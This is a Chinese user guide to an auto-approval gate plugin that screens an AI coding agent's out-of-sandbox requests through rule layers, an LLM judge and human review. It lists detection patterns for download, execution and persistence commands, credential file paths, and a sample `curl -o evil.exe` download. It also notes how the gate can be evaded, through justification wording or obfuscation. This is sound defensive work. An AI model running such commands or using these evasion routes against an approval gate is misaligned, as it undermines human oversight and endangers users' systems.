# dsh-approval-gate 完整指南

> 首页：[简体中文](../README.md) · [English](../README.en.md) · 指南：[中文](GUIDE.md) · [English](GUIDE.en.md)

DeepSeek Harness 自动审批门控插件 v0.9.8：**最小人工介入，只把必须人工确认的操作转人工（fail-safe）**。

当会话的权限预设为 `auto-approve`（自动审批（Flash））时，每次审批请求（沙箱越界）按管道判定：

```
硬拒（凭据外泄 / 根与系统路径销毁）→ 硬事实人工（home 根 / 门的例外）
  → DENY（不可逆危险词）→ 危险动作围栏（v0.9.7：下载 / 动态执行 / 依赖安装 / 持久化 / 递归删除 / 可执行产物）
  → 敏感路径永远人工（v0.9.8）→ DSH 配置自动放行（v0.9.5，v0.9.8 补上命令目标）
  → 白名单（v0.9.8 按命令锚定）→ 定域放行（v0.9.7：目标全在区内）
  → 工作区外一律人工（v0.9.8）
  → denyRules（裁决拒绝升级）→ 脱敏 → 判定（JSON allow/ask/deny，硬类别 / 中立确认 / 失败计数）→ 学习沉淀
```

- **⓪ 硬拒层**（吸收自 [dsh-auto-mode](https://github.com/NanmiCoder/dsh-auto-mode)，**最高优先，判定模型无权推翻**）：基于工具参数的**真实路径与凭据事实**判定，而非 justification 关键词
  - **直接拒绝档**（不弹窗，让 agent 改方案）：
    - **凭据外泄**：对外调用（`web_fetch` / `web_search` / `curl` / `wget`，或 deploy/publish/push/send/release 类工具名）的参数中携带凭据材料；或其 URL 带密码、或带 8 字符以上的 `token`/`api_key`/`signature`/`auth` 查询参数
    - **破坏性目标**：文件系统根（`/`、`C:\`）；操作系统或凭据关键路径（`/etc`、`/bin`、`/sbin`、`/usr`、`/system`、`/library`、`/boot`、`C:\Windows`、`C:\Program Files`、`C:\ProgramData`、`~/.ssh`、`~/.gnupg`、`~/.aws`、`~/.azure`、`~/.kube`、`~/.config/gcloud`）；Windows 设备/NT 命名空间（`\\.\`、`\Device\`、`\\?\`、`\??\`）；Windows 保留设备名（`CON`、`PRN`、`AUX`、`NUL`、`COM1-9`、`LPT1-9`）；含义不明的盘符相对路径
  - **DSH 配置档**（v0.9.5，**自动放行**）：目标在 `$DSH_HOME` 下的 profile / 插件 / 依赖改动（`cordis.patch.yml`、`package.json`、`pnpm-workspace.yaml`、`skills/`、`node_modules/` …）。用户 2026-10-04 决策：这块风险可控，不必每次人工（实测最近 7 天 36 次人工里 20 次是这类）。**两道例外转人工**：① 审批门自身的数据目录 `$DSH_HOME/auto-approve/`（改它等于放行自己）；② 凭据类文件名（`api-key` / `token` / `secret` / `credential` / `.env` / `id_rsa` / `*.pem` / `*.key` …）。本档**排在 DENY 层之后**：危险词仍然最高优先
  - **人工档**（保留手动放行能力）：用户 home 根本身，以及 DSH 配置档的两道例外
  - 常规工作区操作不受影响，绝不被硬拒
  - **⚠️ 人工档排在白名单与学习之前**：命中人工档即 `return`，因此这类操作**不计数、不学习、白名单规则盖不过、也没有追认按钮**。审批记录里只显示「人工通过」，**不会**出现「学习 N/3」——批准再多次也不会自动放行。这是有意语义（home 根、审批门自身数据、凭据文件不由自动审批改写，也不因此被学习成放行规则），不是学习失效。典型现场：反复修改 profile 的 `cordis.patch.yml`（2026-10-02 排查确认）——**该现场已于 v0.9.5 改为自动放行**，因为用户明确认定 DSH 配置改动风险可控
- **① DENY 层**：`rm -rf` / `drop table` / `force push` / 格式化等不可逆危险词命中 → 转人工（fail-safe）
- **①b 危险动作围栏**（v0.9.7，**确定性，命中即转人工且不学习、不可追认**）：详见下文「危险动作围栏」小节。它排在**白名单与学习之前**，因此已沉淀的 `contains` 宽规则盖不过它 —— 否则一次追认就能把「下载」永久放行
- **② 白名单层**：命中规则 → 直接放行（确定性，不过 LLM）。默认规则 `{mode:"workspace-write"}` —— 工作区写入（可回补）自动放行；也支持 `tool/mode/category/contains` 组合规则（含学习沉淀的规则）。**v0.9.8 起 `contains`/`keywords` 只按「命令 + 真实目标」匹配**（详见下文「规则锚定」），模型的说明措辞不再授予权限
- **②b 定域放行**（v0.9.7，可在设置页关闭）：`targetScope === 'inside'` 且未命中围栏 → 直接放行，事件记 `verdict: scope`，**判定器零调用**。`unknown` / `outside` / `mixed` 一律不放行（fail-closed）。它排在白名单**之后**，因此已有规则的归因与行为完全不变，本层只**新增**放行
- **③ denyRules 层**：此前用户**裁决拒绝**过的「工具+模式+类别」→ 永久转人工（不会自动放行用户明确拒绝过的操作）
- **④ 脱敏**（吸收自 dsh-auto-mode）：送判定模型前先抹除密钥、截断大块正文（见下文「判定输入脱敏」）
- **⑤ 判定**（仅越界请求）：输出**严格 JSON** `{decision, reason, category}`
  - **硬风险类别最先裁决**（`deletion` 删除 / `credential` 凭据 / `remote` 远程生产 / `system` 系统路径 / `bulk` 批量不可回补）→ **直接转人工**（必须人工确认，不计数、不学习）。这是一道**对称安全闸**：无论模型给 `allow` 还是 `deny`，命中硬类别一律转人工，模型的裁决不能绕过它
  - `decision: "deny"` 且类别为 `neutral` → **静默拒绝**（不弹窗），agent 应改换更安全的方案；该记录会常驻提示条，可在审批视图里**追认**（见下文）
  - `decision: "allow"` → 自动放行
  - `decision: "ask"` → 转人工
  - `neutral`（中立，无硬风险特征）→ **人工确认制**：前 N 次转人工确认，之后进入阈值状态
  - 判定器**连续失败计数**（吸收自 dsh-auto-mode）：前 2 次静默拒绝，第 3 次转一次人工；成功一次即清零
- **⑥ 学习沉淀**（neutral 类别，N=3 时：前 3 次人工确认，第 4 次起进入阈值状态）
  - 阈值前：一律人工确认，**批准** → 计数 +1 并记录**操作样本**（指纹 + 操作背景/目的）；**拒绝** → 升级 denyRules
  - 阈值状态（计数 ≥ N）三种分流：
    1. **指纹确定性命中**（本次操作在确认样本中）→ 自动放行 + 沉淀 `{tool, mode, category, contains}` 规则
    2. **指纹未命中但有确认样本** → 把本次操作的背景/目的 + 用户确认过的样本交给 flash **第三方同类验证**：判 `SAME`（与已确认样本同类）→ 自动放行（有指纹则沉淀）；判 `DIFFERENT`/验证失败 → 人工确认
    3. **无确认样本** → 人工确认
  - 用户**拒绝** → 升级进 denyRules（带指纹；提取不到指纹则拦全部同类，拒绝从严）
  - 取消/不可用 → 不计数（用户未表态，下次仍人工确认）
  - 硬类别/DENY/验证失败永远人工，同类验证只作用于 neutral 阈值状态

## 安装

```sh
# 从本仓库安装（推荐）
dsh plugin --profile web add "github:IamNewHands/dsh-approval-gate#main"
```

> 注意：npm 上的 `dsh-approval-gate` 仍是上游 0.5.0，不含本仓库的修复，请勿按包名安装。

## ⚠️ 安装后必须手动配置权限预设（关键步骤）

插件无法向权限预设表添加选项（预设表在配置构造时冻结），需要手动在 profile 的 `cordis.patch.yml` 中补一条 preset：

编辑 `~/.dsh/profiles/web/cordis.patch.yml`，追加（或合并进已有的 `permission` 行——**loader 的 patch 会整体替换目标行的 config，若已有该行必须重述全部预设**）：

```yaml
- id: permission
  name: '@deepseek-ai/dsh-permission-presets'
  config:
    presets:
      read-only:
        sandbox: read-only
        approval: ask
      workspace-write:
        sandbox: workspace-write
        approval: ask
      danger-full-access:
        sandbox: danger-full-access
        approval: never
      auto-approve:
        sandbox: workspace-write
        approval: ask
        name: 自动审批（Flash）
        description: 多级判定：工作区写入自动放行，危险操作转人工审批。
```

重启 `dsh web` 后，权限下拉菜单会出现「自动审批（Flash）」选项。

## 配置（可选）

数据文件统一放在 `$DSH_HOME/auto-approve/`（默认 `~/.dsh/auto-approve/`）：

| 文件 | 说明 |
|------|------|
| `allowlist.json` | 白名单/黑名单/阈值配置（首次运行自动生成默认值，旧版自动迁移，修改即时生效无需重启） |
| `learning.json` | 学习状态（自动维护，跨会话持久化） |
| `audit.log` | 审计日志（追加式） |
| `events.jsonl` | 自动放行事件（供审查 UI 展示，按会话隔离） |
| `snapshots/` | 自动放行文件的改动前快照（按事件 ID 命名，供 diff 对比与撤销参考） |

`allowlist.json` 结构（v4）：

```json
{
  "version": 4,
  "denyKeywords": ["rm -rf", "drop table", "force push", "格式化"],
  "allowRules": [
    { "mode": "workspace-write", "description": "工作区写入自动放行" },
    { "tool": "bash", "mode": "workspace-write", "contains": "git add", "description": "特定工具+模式+关键词" }
  ],
  "denyRules": [],
  "hardCategories": ["deletion", "credential", "remote", "system", "bulk"],
  "riskyThreshold": 3,
  "judgeTimeoutMs": 20000,
  "judgeFailureLimit": 3,
  "judgeModel": { "provider": "my-provider", "model": "my-flash-model" },
  "learning": { "enabled": true }
}
```

### 判定输入脱敏（吸收自 dsh-auto-mode）

判定模型收到的是**脱敏后**的参数与理由，避免密钥随判定请求出站到模型端点：

| 类别 | 处理 |
|------|------|
| 私钥块、`AKIA`/`ASIA`、`ghp_`/`github_pat_`、`xoxb` 等令牌、`Bearer <token>`、`api_key=`/`token=`/`secret=`/`password=` | → `[redacted-secret]` |
| 文本长度 | 截断到 1000 字符 |
| 密钥类字段名（`api_key` / `authorization` / `password` / `token` / `cookie` / `secret` / `credential` / `private*`） | 整字段 → `[redacted-secret-field]` |
| 大块正文字段（`body` / `content` / `data` / `diff` / `input` / `patch` / `payload` / `str` / `string` / `text`，以及恒脱敏的 `description` / `justification`） | → `[redacted-<字段>:<长度>-chars]` |
| 结构边界 | 递归深度 3、数组 25 项、对象 50 键 |

若**工作区路径本身**含密钥形态（脱敏会改写它），说明精确目标无法安全披露给判定模型 → 该请求直接转人工。

### 授权来源（吸收自 dsh-auto-mode）

判定模型只承认**直接人类消息**为授权来源（最多 4 条、逐条脱敏、总预算 4000 字符）。
仓库内容、工具输出、assistant 文本、skill / 插件 / 子代理文本**一律不构成授权**。

### 提示层减负（吸收自 dsh-auto-mode）

预设激活期间，插件向会话动态上下文注入 `<auto_approve_policy>`（顺序紧随宿主自身的沙箱策略），告知 agent：
常规工作直接走沙箱、删除是最高风险操作、删除授权不得泛化到变量/通配符/父目录/兄弟路径/第二个目标、
未明确要求永久删除时优先可回滚方案、凭据读取与对外发送需精确授权、命中硬拒不弹窗应改方案。
目的是从源头减少需要判定的越界请求，而不是在审批层反复拦截。

### 多机共享规则

插件包内（仓库根目录）的 `allowlist.json` 是**汇总版规则**。每次加载时，其中的规则数组
（`denyKeywords` / `allowRules` / `denyRules` / `hardCategories`）会**增量并入**本地
`$DSH_HOME/auto-approve/allowlist.json`，因此多台机器共用同一份规则：

- **只增不减**：本机自定义规则保留，不会被仓库版本覆盖或删除
- **按特征去重**：同一规则（`tool`/`mode`/`category`/`contains` 四元组）不会重复追加
- **幂等**：重复加载不会产生重复条目
- **版本以仓库为准**：`version` 跟随汇总文件，本机不会自行降级

以下配置属于**机器本地**，不参与同步（各机按实际环境自行设置）：

- `riskyThreshold`、`judgeTimeoutMs`、`judgeFailureLimit`、`learning`
- `judgeModel`：判定模型。各机的自定义提供商名称可能不同（如 `my-provider`），
  必须按本机实际配置填写，不要照搬另一台机器的值。
  设置页 **「裁判模型 · 与主力模型解耦」** 卡片可直接下拉选择（路由 + 模型，首项为
  「跟随 agent 默认模型」），**无需手改本文件**；模型目录不可用时该卡片退化为手填输入框。
  建议固定为一个「单次请求就能作答」的模型——多步工具循环型模型（如 `agy`）在
  `judgeTimeoutMs` 内跑不完，表现为「每次审批都转人工」

> 旧版本（上游 0.5.0）使用的 `model` 字段已更名为 `judgeModel`。加载时会自动迁移：
> 保留本机原有取值写入 `judgeModel`，并移除旧的 `model` 键；若已显式配置
> `judgeModel`，则以它为准。

- `denyKeywords`：命中即转人工（不可逆危险操作）
- `allowRules`：每条规则 `tool` / `mode` / `category` / `contains` 均满足才放行（缺省表示任意）。学习沉淀的规则也会写入这里
- `denyRules`：用户裁决拒绝后自动写入，命中即转人工（不学习）
- `hardCategories`：判定为这些类别 → 直接转人工（不计数、不学习）；即使判定模型给出 `allow`，命中硬类别也强制转人工
- `riskyThreshold`：中立类别的人工确认阈值（默认 3）——同一「工具+模式+类别」被人工确认 N 次后，第 N+1 次起自动放行并沉淀规则
- `judgeTimeoutMs`：单次判定超时（默认 20000ms，超时自动重试 1 次）
- `judgeFailureLimit`：判定器**连续失败**多少次后转一次人工（默认 3）。前 2 次失败静默拒绝让 agent 改方案，第 3 次转人工，避免判定器长期不可用时卡死任务；判定成功一次即清零

## 使用

在会话的权限下拉（`/permission` 弹窗或设置页）选中**「自动审批（Flash）」**，该会话即启用自动审批；其他会话不受影响（按会话预设门控）。

## 设置页（v0.4.1+）

DSH 设置面板新增「自动审批」分区（settings.section，样式与 DSH 原生设置一致），按管道顺序提供可视化规则管理，每张卡片标注管道阶段：

- **初始化卡片**：检测 `cordis.patch.yml` 是否已含 auto-approve 权限预设；未配置时点「一键配置」自动写入（文本级修改，保留注释格式），重启后生效
- **管道总览**：判定链路 + 生效的硬风险类别徽标
- **① DENY 层 · 黑名单**（denyKeywords）：查看/添加/删除危险词（删除预置词有确认提示）
- **② 白名单层 · 白名单**（allowRules）：查看（来源标签 预置 / 沉淀 / 用户 + 作用域标签 **全局** / **本会话**，会话规则显示归属会话）/添加（tool/mode/category/contains 表单）/删除 / **提升为全局**（会话规则一键改全局）。卡片顶部可设置**「新审批沉淀的作用域」**：仅本会话（默认）/ 全局
- **③ denyRules 层 · 永久人工**：拒绝升级的规则，查看/移除。**有意不按会话隔离**：跨会话只会多弹一次人工，不会放行任何东西
- **④ Flash 判定 · 阈值与超时**：`riskyThreshold`（同一会话内学习满 N 次后第 N+1 次自动放行）/ `judgeTimeoutMs` 直接修改
- **⑤ 学习沉淀 · 正在学习**：展示确认计数（n/N）与样本，计数**按会话隔离**（key 为 `会话|工具|模式|类别`，界面只显示后三段+会话号）；**「终止」按钮可介入删除**（删除计数与样本，重新学习）

所有修改通过 `POST /api/auto-approve/rules` 写入 `allowlist.json`，**热更新即时生效**（无需重启）；`POST /api/auto-approve/setup` 负责一键初始化。

## 人工审查 UI（v0.4.0+）

每次命令被自动放行或转人工审批时，提供审查入口（严格按 DSH 设计语言，`--dsw-alias-*` tokens）：

1. **提示条**（输入框上方独立一行，`conversation.input.dock` order=30，不随流式对话滚动）：
   - 自动放行 → 绿色 ✅：工具 + 摘要 + 判定路径（白名单规则 / Flash 判定安全 / 沉淀规则 / 已确认操作 / Flash 同类验证），几秒后收起
   - **转人工审批 → 橙黄色**（`--dsw-alias-state-warn-*`）：显示「等待人工审批：<操作>」，**不自动收起**，直到你确认
   - **静默拒绝 / 人工拒绝 → 红色**（v0.7.0+）：显示「已直接拒绝：<操作>」或「已拒绝：<操作>」，**不自动收起**——一直挂在对话框上方，直到你切到「审批」tab 或按下处理按钮。已追认的拒绝不算待处理，刷新时不会作为红色提示条恢复，提示条文案也随之翻转为「已追认放行」（v0.7.1）。提示条右侧提供：
     - **「查看审批记录」**：切到「审批」tab（等于已读，提示条随即收起）
     - **「重新审批通过」**：仅在该拒绝**可追认**时出现（见下文），点了就写入自动放行规则并让 AI 重试该操作
   - 人工通过 → 橙黄「学习 n/N，满 N 次后自动放行」（几秒后收起）
   - 打开会话时只恢复**未读的拒绝**，不弹自动放行的历史记录
   - 已读位置按会话持久化在浏览器 `localStorage`（`dsh-approval-gate.seenRejects`）：刷新页面不会丢待处理记录，也不会重复打扰已读记录
2. **「审批」历史视图**：会话视图切换条「轨迹」右侧的「审批」tab（`conversation.view` order=20）。标题旁显示**待处理 N**（仍未追认的拒绝数）。当前会话记录（**最新在上**）：自动放行（绿 ✅）、人工通过（橙黄 + 学习计数 n/N）、人工拒绝（红）、静默拒绝（红 + 「重新审批通过」按钮）
3. **追认（「重新审批通过」，v0.7.0+）**：被拒绝的记录可以追认，效果是**写入带操作指纹的自动放行规则 + 向会话投递一条重试指令**（让 AI 重跑那个操作，不必你手敲一遍）。两道围栏：
   - **只有判定层静默拒绝可追认**：`judge-deny`（判定器 `deny` / 连续失败静默拒绝）。**确定性硬拒档**（`hard-reject`：凭据外泄、文件系统根与系统路径销毁）位于管道最前，白名单规则盖不过它——给按钮就是假承诺，因此不提供
   - **硬风险类别不可追认**：`deletion`/`credential`/`remote`/`system`/`bulk` 属于「必须每次人工确认」，不接受追认式自动放行；如需放开请改 `hardCategories` 或改用白名单规则
   - 重复追认幂等（规则不重复写入）；追认后该记录标注「已追认放行 · <原因>（曾直接拒绝）」并从待处理计数中移除（v0.7.1 起文案与配色一起翻转，不再看起来像仍在拒绝）
4. **文件改动对比与撤销**（v0.5.0+）：自动放行且涉及文件时，host 在审批（写入前）保存文件**改动前快照**；历史视图中对应事件的**文件标签变为可点击**（蓝色描边），点击弹出 diff 面板：
   - **只看变更行**：绿底 `+` 为新增行、红底 `-` 为删除行（经典 diff 语义），头部显示 +N / -M 行统计与「未变行」数；文件当前已不存在会提示
   - **撤销此改动**：向当前会话投递一条撤销指令（含操作说明、涉及文件、事件时间、快照目录位置），AI 据此把文件恢复为审批前状态
   - **diff 快照管理**：视图顶部显示「diff 快照 占用 · 条数」，并提供两个清理入口——**「仅清本会话」**（只删除当前会话的快照，不影响其他会话未查看的 diff）与**「清空全部」**（二次确认后清空所有会话；均仅删除对比数据，不影响审批记录本身，删除后历史文件不可再查看对比）
   - 限制：仅文本文件（单文件 ≤256KB、每事件 ≤5 个文件）会保存快照，二进制/超限文件不可点击

数据链路：host 每次判定追加结构化事件到 `~/.dsh/auto-approve/events.jsonl`（`kind`: auto / manual-pending / manual-approved / manual-rejected / hard-reject / judge-deny / reconsidered，含 sessionId/tool/mode/reason/justification/verdict/files/learningCount/threshold，v0.8.1 起的中文说明 `zh`，v0.9.0 起的结构化事实 `facts`，以及 v0.9.6 起的目标定域 `targets` / `targetScope` / `targetTraversal`，v0.9.7 起的围栏拦截原因 `facts.fenceText` 与定域放行 `verdict: scope`），浏览器通过 `GET /api/auto-approve/events?sessionId=&since=` 轮询（2s 增量 / 视图 5s 全量）。

> `zh` 是**面向审批人的中文说明**（v0.8.1+，v0.9.0 起按字段分行）：`src/zh.mjs` 用真实事实（目标模式 / 真实命令 / 真实目标路径）生成，形如「操作：删除 / 路径：C:\temp\a.txt / 影响：整机（工作区外任意路径可读写，含系统位置；改动不可自动回滚）/ 命令：Remove-Item C:\temp\a.txt / 原因：<模型原文>」；命令与路径原样保留，模型原文放在「原因」行。原文已是中文且无提权事实时不改写（返回 null）。前端优先渲染 `zh`，缺 `zh`（老事件）回退 `justification`；`justification` 永远保存原文。

> `facts` 是**结构化审批事实**（v0.9.0+，v0.9.6 起含目标定域）：字段为 `tool` / `action`（操作类型：删除、推送/发布、新增/写入、修改、执行命令、读取、检索、调用）/ `actionKey`（供前端配色）/ `mode` / `scopeShort`（整机、工作区、只读、未提权）/ `scopeDetail`（后果一句话）/ `paths[]`（最多 8 条，绝对路径目标在前、写目标在后）/ `pathsMissing` / **`targetScope`**（`inside` / `outside` / `mixed` / `unknown`）/ **`targetScopeText`**（中文一句话）/ **`targetTraversal`**（命令里有 `..` 穿越）/ **`fenceText`**（v0.9.7：围栏拦截原因，命中时才有）/ `command` / `commandLabel` / `reason`。落盘前经 `compactFacts()` 白名单过滤与逐项截断，避免 `events.jsonl` 无界膨胀；**盘上缺 `facts` 的老事件由事件 API 在响应里按已记录的事实（tool / mode / files / command / justification）现算补上，不回写文件**——事件日志保留当初写下的事实。浏览器端**审批记录行优先渲染 `facts` 字段表格**（操作类型 / 操作路径 / **目标位置** / 影响范围 / 执行命令 / 模型说明，命中围栏时另加「**拦截原因**」行；另附非 neutral 的风险类别），`facts` 缺失的老事件回退渲染 `zh` / `justification` 文本。注意：宿主审批卡（`dsh-client-ui-approval`）把 `reason` 当纯文本渲染、不解析 Markdown/HTML 且不保留换行，因此卡片上只能显示字段分行的纯文本，**表格只存在于本插件的「审批」视图**；不注入依赖宿主内部 DOM 的 CSS，以免 DSH 升级后样式失效。

> **目标定域**（v0.9.6+）：事件新增 `targets`（绝对路径，最多 12 条）与 `targetScope`。它与 `facts.scopeShort`（沙箱模式的影响范围）是**两个不同的轴**：`targetScope` 回答「这次碰的是哪些位置」，字段表格里单独占「目标位置」一行，非 `inside` 时用警示色。语义刻意保守（fail-closed）：
>
> | 情形 | `targetScope` |
> |---|---|
> | 提取到的 `data` 目标全在 workspace 之下 | `inside` |
> | 有 workspace 之外的目标（无内部目标） | `outside` |
> | 内外都有 | `mixed` |
> | 一个 `data` 目标都没有（相对片段、`-D $dir` 这类变量、只有 URL） | `unknown` |
> | 命令里有 `..\` / `../` 穿越且字面量全在工作区内 | 降级为 `unknown` |
>
> `unknown` **必须**与 `outside` 同等对待，不得读成「工作区内」。只提取**绝对路径字面量**：`origin/main`、`refs/heads/x`、`src/a.ts`、`IamNewHands/repo`、URL 路径段一律不产出目标；引号内的整段优先（`'C:\Program Files\Git\bin\bash.exe'` 不会被截成 `C:\Program`）；`/d/GitHub_Clone/x`（Git-Bash 写法）折算到 `D:` 后比较；系统程序位置（`/usr/bin/env`、`C:\Windows\System32\…`、`C:\Program Files\…`）与设备伪文件（`/dev/null`）不算 `data` 目标。**`files` 语义不变**：仍只装写目标（供改动前快照），只读目标只进 `targets` —— 否则 `Get-Content ~/.ssh/id_rsa` 会把私钥内容复制进审批门自己的快照目录。判定模型的 `filesystemEffects` 用「命令绝对路径 ∪ 写目标」，因此命令类工具不再以「不涉及任何文件」的形态送判。**本版不改动确定性裁决逻辑**（硬拒 / 危险词 / 白名单 / 学习一行未动）：`unknown` / `outside` 目前只落审计，不影响放行与转人工；但判定模型的输入变了，判定层对命令类调用的裁决可能与以前不同。已知误报：命令里内嵌脚本/配置正文时可能产出 POSIX 根形态的假目标（如 heredoc 里的 `/build-app.yml`），只会让定域偏保守。

> **危险动作围栏 + 定域放行**（v0.9.7+，用户 2026-10-04 决策）：工作区内的增删改查风险可控、不必每次人工；但模型被诱导下载恶意脚本 / exe 时必须触发审批。这两条天然矛盾 —— `curl -o evil.exe http://x/y` 的目标**完全在工作区内**，纯定域规则会直接放行。因此围栏是定域放行之上的**否决层**，且排在白名单与学习**之前**。
>
> | 类别 | 命中特征 | 豁免 |
> |---|---|---|
> | 网络下载 | `curl` / `wget` / `aria2c` / `bitsadmin` / `Invoke-WebRequest`\|`iwr` / `Invoke-RestMethod`\|`irm` / `Start-BitsTransfer` / `certutil -urlcache` / `DownloadString`\|`DownloadFile`\|`DownloadData` / `gh release download` | 命令里的 URL **全部**指向本机（`http://127.0.0.1:1933/health` 是健康检查，不是取物） |
> | 动态执行 | `Invoke-Expression` / `iex` / `-EncodedCommand` / `FromBase64String` / `certutil -decode` / `\| bash`\|`sh`\|`pwsh`\|`powershell`\|`cmd`\|`iex` | — |
> | 依赖安装 | `npm`\|`pnpm`\|`yarn`\|`bun` `i`\|`install`\|`add`\|`dlx`\|`exec` / `pip install` / `cargo`\|`go`\|`winget`\|`choco`\|`scoop install` / `docker pull` | 命令指向 `$DSH_HOME`（profile / 插件依赖那一档本就自动放行） |
> | 持久化 | `schtasks` / `reg add` / `New-Service` / `sc create` / `core.hooksPath` / `Set-ExecutionPolicy` / `netsh advfirewall` / `Add-MpPreference` / `bcdedit` / `wmic` / `takeown` / `icacls` | — |
> | 递归删除 | `Remove-Item … -Recurse` / `rm -r…` / `rmdir /s` / `rmtree` / `git clean` / `git reset --hard` | **单文件清理不拦**：推送后删掉 `_commit-msg.txt` 是日常动作（30 天 36 次），全拦会把人工提示从 147 抬到 180 |
> | 可执行产物 | 写目标扩展名 `.exe .dll .msi .bat .cmd .ps1 .vbs .hta .lnk .reg .jar …`，或落在 `.git/hooks/`、`.github/workflows/`、`Startup/`、`sitecustomize.py` | `.sh`/`.py`/`.js` 不在列（开发工作区天天产出）；「下载 `.sh` 再执行」由前两行覆盖 |
>
> 判定口径刻意收窄（每条都对应实测到的假命中）：**命令类工具只看命令里的「落盘目标」**（重定向 / `-OutFile` / `-o` / `--output` / `-DestinationPath` / `Out-File` / `Set-Content` / `open(...,'w')`），不看它被 `resolveToolCallFiles` 判定的「写目标」—— 后者的写特征很宽（`*>` 重定向就算写），会把 `pwsh -File .\build.ps1 *> .\tmp\x.log` 里**被执行**的 `.ps1` 误判成「本次产出的可执行文件」；**持久化按动词判定**，`.github/workflows` 出现在读取命令或 `git add` 参数里不是持久化；`Start-Process` 不在围栏里（启动本地服务是常规动作）。
>
> 命中即转人工，且**不学习、不可追认**（`forwardToHuman` 只在 `why='flash-failed'` 时沉淀规则）。拦截原因进事件（`facts.fenceText`）与中文卡正文（新增 `拦截：…` 行），字段表格新增「拦截原因」行（警示色）。
>
> 定域放行的定域输入包含**解析后的相对写目标**：`write` / `edit` 常给 `src/x.mjs`，不解析就永远是 `unknown`（= 不放行），这条最常见的写操作本来会完全失效。设置页开关「定域放行：目标全部在工作区内 → 直接放行」可一键回到旧行为。
>
> 实测（真实 `events.jsonl`，30 天 1204 事件 / 147 次人工提示）：围栏命中 **23 次**（其中 13 次原本自动放行 ⇒ 约 +0.4 次人工/天），定域放行省下 **23 次**人工提示，**净少 10 次（−7%）**。人工提示分布 `unknown` 83 / `outside` 35 / `inside` 27 / `mixed` 2 —— 区内只占 18%，所以定域放行的上限本来就不高。围栏贡献最大的一项是**递归删除（15 次）**，其中 4 次是 heredoc 脚本正文含 `rm -rf` 的假命中。
>
> **诚实交代**：围栏是**文本特征**匹配，能被刻意混淆绕过（base64、变量拼接、二次下载、先写脚本再执行）。它挡的是「模型被诱导」这类非对抗性失败，不是定向攻击；真正的边界仍然是沙箱与人工。
>
> **行为变化**：判定器看到的流量变窄 —— 工作区内的调用不再进入判定层（原先「区内调用 → 判定器 → allow」的路径改由确定性规则接管）。

> **规则锚定 / 工作区外一律人工 / 敏感路径永远人工**（v0.9.8+，用户 2026-10-05 决策）：三件事一起落地，都是为了「模型不能靠措辞或偶发路径拿到权限」。
>
> **① 规则只按真实事实匹配（按命令锚定）**。规则的 `contains`/`keywords` 原本匹配 `justification + 命令 + files`，于是说明里写「git push 需要凭据管理器」，`contains:"git"` 就放行任意命令。现在锚定文本 `ruleAnchorText(command, files, targets)` **只装真实事实**，白名单层改用它匹配。实测 30 天 897 条自动放行里，**30 条**有真实命令的规则放行在锚定后不再命中（`gh run view` 被 `contains:"github"`、`npm test` 被 `contains:"vitest"`、`pwsh -File verify-branches.ps1` 被 `contains:"git"` —— 共同点是命令里根本没有那个词）；另有 **212 条**的命令**根本没被记录**，锚定为空 ⇒ 含 `contains` 的规则不匹配（fail-closed），改由判定器裁决。
>
> 指纹来源同步锚定：追认 / 判定器不可用沉淀 / 中立确认学习的指纹都取自锚定文本，规则才能在锚定后的白名单层命中；**看不见真实操作时**退回说明措辞（否则「追认了却写不出指纹」，重试仍被拒）。追认的 `contains` 改为**目录级**（`extractRuleFingerprint`：绝对路径取一级父目录），否则同一目录换个文件名就要重新审批、规则无限增殖 —— 用户手写的 Rime 规则正是这个形状。`extractFingerprintCandidates` 也增加了一级父目录候选。
>
> **两处刻意不锚定**：一次性凭条（追认选「仅本次」，用户对某一次重试的显式放行）与 `denyRules`（拒绝侧失配会让本该拦下的操作落到判定器手里，是安全回归）。两者都用 `looseMatchContext`（含措辞的宽松上下文）。
>
> **② 工作区外一律人工**：目标含工作区之外的路径（`outside` / `mixed`）→ 人工。**排在白名单之后** —— 「一律」约束的是默认姿态，不是你手写的规则；`%APPDATA%\Rime`、`weaseldeployer.exe` 这类**本身就在区外**的规则仍然生效。刻意**不覆盖 `unknown`**：提不出绝对路径不等于在区外（30 天 368 条自动放行落在 unknown），一并拦下等于把所有命令类调用打回人工。
>
> **DSH 配置档补口**：命令类工具没有 `file_path`，`hardDenyFacts` 的 dsh-config 档一直没生效。新增「命令目标全在 `$DSH_HOME` 下 → 自动放行」，实测把 **54 条**区外维护（`pnpm --dir … install`、改 pin、备份 `cordis.patch.yml`）留在自动档；例外仍是审批门自身数据目录与凭据类文件名。设置页新增「工作区外一律人工」开关。
>
> **③ 敏感路径形态永远人工**：`sensitiveTargetHit(paths)` 命中即人工，排在 DSH 配置自动放行与白名单**之前** —— 凭据文件不因为「路径在 profile 下」或「规则命中」而被放行。口径是**目录段 / 文件名**，不做全路径子串匹配：`.ssh` `.aws` `.gnupg` `.kube` `.docker` `gcloud` `auto-approve` / `id_rsa` `credentials*` `.env*` `.npmrc` `.netrc` `.git-credentials` `*.pem` `*.key` `*.pfx` `*.p12` `*.kdbx` `Cookies` `Login Data` `Web Data` `Local State`。工作区内的 `.env` 同样命中；`src/credential/transport.ts`、`scripts/secure-secret-hydration.test.ts` 这类源码文件不误报（宽口径版本实测 2 次误报，收紧后 0）。
>
> **实测**（30 天 1210 事件 / 897 条自动放行 / 147 次人工提示）：因第 ④ 步变成人工的 **31** 条（敏感路径 2 + 工作区外 29）⇒ 人工提示 **147 → 178（+21%）**；DSH 配置档补口保住 **54** 条；锚定修掉 **30** 条真误放行、**212** 条改由判定器裁决。规则表 39 条里 **9 条**在真实命令上一次都没命中（`worker process` / `child process` / `subprocess` / `凭据` / `typescript` / `eslint` / `weaseldeployer.exe` / `workspace-write` / …），建议按命令里的真实词重写或删掉；「0 命中」也可能只是那段时间没记录到命令，不是判决书。
>
> **行为变化**：判定器流量变宽（212 条改由它裁决，判定器不可用时转人工）；**工作区外不再沉淀规则** —— `forwardToHuman(..., 'outside')` 只记事件不写规则，「一律人工」意味着每次都过目。


> 顶部「审批」tab 的条数（v0.9.0+）：宿主把 `conversation.view` 的 `label` 经 `resolveSlotLabel()` 的结果**当字符串**渲染 tab 文案，且只在「slot 变更 / locale 发布」时重算 tab 列表（`refreshViews` 同时订阅 `slots.subscribe` 与 `locale.subscribe`）。因此条数实现为 **label thunk 读模块级计数 + 条数真变化时发布一次 locale**（注册一次性 namespace 后立即撤销，避免「同一 namespace 不能重复 register」）。口径 = 本会话「审批」视图真正列出的行数（`manual-pending` 只活在提示条里，不计入），数字与打开 tab 后看到的行数一致。`locale` 服务不可用时退回静态「审批」，不影响审批本身。

